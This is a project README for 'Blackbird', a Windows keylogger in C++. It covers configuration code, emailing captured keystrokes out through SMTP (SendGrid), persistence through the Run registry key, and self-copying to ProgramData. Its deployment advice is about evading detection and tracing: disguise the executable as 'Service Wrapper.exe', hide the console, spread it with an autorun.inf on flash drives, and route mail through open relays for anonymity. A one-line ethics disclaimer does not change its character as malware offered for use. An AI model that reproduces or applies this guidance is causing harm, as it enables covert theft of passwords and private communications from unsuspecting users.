# Blackbird
A little bird that tells you. Capable Windows userspace keylogger in ~300 lines of modern C++.

## Features
- Logs to an offline file and/or an e-mail address.
- Respects the user locale and outputs UTF-8, hence supports all keyboard layouts and languages.
- Minimal memory consumption and performance impact.
- Capable of logging all users when deployed as admin, distinguishing logs by usernames.
- Capable of copying itself into a system directory when run, to ease deployment via autorun flash drives.
- Capable of running automatically on system startup.

## Building
- Configure and generate with CMake.
- Build the `blackbird` (or `ALL_BUILD`) target with Visual Studio.

## Adjusting the settings
You can adjust the settings in the main function:
```cpp
std::int32_t WinMain(HINSTANCE, HINSTANCE, LPTSTR, std::int32_t)
{
  const blackbird::settings settings
  {
    .update_interval     = std::chrono::milliseconds(10),
    .save_interval       = std::chrono::seconds     (900),

    .save_to_file        = true,
    .file_prefix         = L"" ,

    .save_to_email       = false,
    .email_host          = "",
    .email_api_key       = "",
    .email_address       = "",

    .copy_to_system      = false,
    .system_directory    = _wgetenv(L"ProgramData"),

    .auto_run_on_startup = false,
    .registry_name       = L"Service"
  };

  blackbird::key_logger(settings).run();
}
```

### Explanation of settings
| Name                  | Explanation                                                                                                                                                                                                                                                               | 
|-----------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `update_interval`     | The interval between two keyboard state checks. Increasing the interval improves performance but may lead to missed key presses. The default of 10 milliseconds leads to 100 updates per second and is generally sufficient.                                              |
| `save_interval`       | The interval between two logs. The default of 15 minutes yields a maximum of 96 log files/e-mails per day.                                                                                                                                                                |
| `save_to_file`        | Toggle to enable logging to files.                                                                                                                                                                                                                                        |
| `file_prefix`         | The prefix that will be prepended to each log filepath. It can be anything, including empty string which is the default. If set to an existing directory (including the trailing slash), it will cause the logs to be recorded to a location other than the executable's. |
| `save_to_email`       | Toggle to enable logging to an e-mail address. Requires `email_host`, `email_api_key` and `email_address` to be set. See the [Using the e-mail functionality](#using-the-e-mail-functionality) section for more detail.                                                   |
| `email_host`          | The address of the SMTP service.                                                                                                                                                                                                                                          |
| `email_api_key`       | The API key provided by the SMTP service.                                                                                                                                                                                                                                 |
| `email_address`       | The e-mail address that will receive the logs. Independent of the SMTP service.                                                                                                                                                                                           |
| `copy_to_system`      | Toggle to enable copying the executable to a system directory on first run. Requires `system_directory` to be set.                                                                                                                                                        |
| `system_directory`    | The existing directory which the executable will be copied to. The default is the `%ProgramData%` directory, which does not require admin privileges, and is generally sufficient.                                                                                        |
| `auto_run_on_startup` | Toggle to enable running automatically on system startup. Requires `registry_name` to be set.                                                                                                                                                                             |
| `registry_name`       | The name which the executable will be mapped to under `Software\Microsoft\Windows\CurrentVersion\Run`. It can be anything, excluding empty string. The default is `Service`, and is generally sufficient.                                                                 |

### Using the e-mail functionality
In order to use the e-mail functionality, you need access to an SMTP service. [Twilio SendGrid](https://sendgrid.com) provides one such service that is free for 100 emails per day, which is enough for logging one device every 15 minutes. You can create an account and a project with API key on their website, and update the settings as the following:
```cpp
    .save_to_email       = true,
    .email_host          = "smtp.sendgrid.net",
    .email_api_key       = "[YOUR_API_KEY]",
    .email_address       = "[YOUR_EMAIL_ADDRESS]",
```
Note that most of such services are traceable to your person. For anonymity you should look into [open mail relays](https://en.wikipedia.org/wiki/Open_mail_relay) such as John Gilmore's `new.toad.com`, or set up your own SMTP server.

## Reminders for deploying
- Build in `Release` mode. This makes the console invisible, and is necessary for copying into system directory and running at startup functionalities to work.
- Rename the executable to something generic such as `Service Wrapper.exe`. This is the name that will appear in the system directory and the Task Manager.
- To deploy using a flash drive or similar media, you can create an `autorun.inf` file with the following content:
```
[autorun]
shellexecute=[PATH_TO_YOUR_EXE].exe
```

## Ethics
I do not endorse the use of this software for malicious purposes in any way.